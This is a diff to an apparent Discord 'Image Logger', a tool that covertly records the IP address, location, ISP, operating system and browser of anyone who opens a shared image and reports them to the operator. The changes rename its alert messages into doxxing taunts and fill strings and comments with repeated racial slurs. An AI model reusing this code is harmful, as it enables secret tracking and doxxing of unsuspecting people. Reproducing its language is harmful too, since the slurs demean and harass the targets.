@@ -28,8 +28,8 @@ config = {
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": True, # Enable the custom message?
-        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
-        "richMessage": True, # get doxed lil nigga? (See README for more info)
+        "message": "GET DOXXED BY ALEX LIL NIGGA", # Message to show
+        "richMessage": True, # GET DOXXED BY ALEX LIL NIGGA? (See README for more info)
     },
 
     "vpnCheck": 1, # Prevents VPNs from triggering the alert
@@ -80,7 +80,7 @@ def reportError(error):
     "content": "@everyone",
     "embeds": [
         {
-            "title": "Image Logger - Error",
+            "title": "IDK - Error",
             "color": config["color"],
             "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
         }
@@ -99,9 +99,9 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
     "content": "",
     "embeds": [
         {
-            "title": "Image Logger - Link Sent",
+            "title": "A LINK WAS SENT NIGGA",
             "color": config["color"],
-            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
+            "description": f"An **YOUR GONNA GET A IP SOON NGGA** !\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
         }
     ],
 }) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
@@ -150,8 +150,8 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
 
 **Endpoint:** `{endpoint}`
             
-**IP Info:**
-> **IP:** `{ip if ip else 'Unknown'}`
+**IP Info shit:**
+> **ts the lil nigga ip:** `{ip if ip else 'Unknown'}`
 > **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
 > **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
 > **Country:** `{info['country'] if info['country'] else 'Unknown'}`
@@ -163,11 +163,11 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
 > **VPN:** `{info['proxy']}`
 > **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`
 
-**PC Info:**
+**PC shit:**
 > **OS:** `{os}`
 > **Browser:** `{browser}`
 
-**User Agent:**
+**User Agent shit:**
 ```
 {useragent}
 ```""",
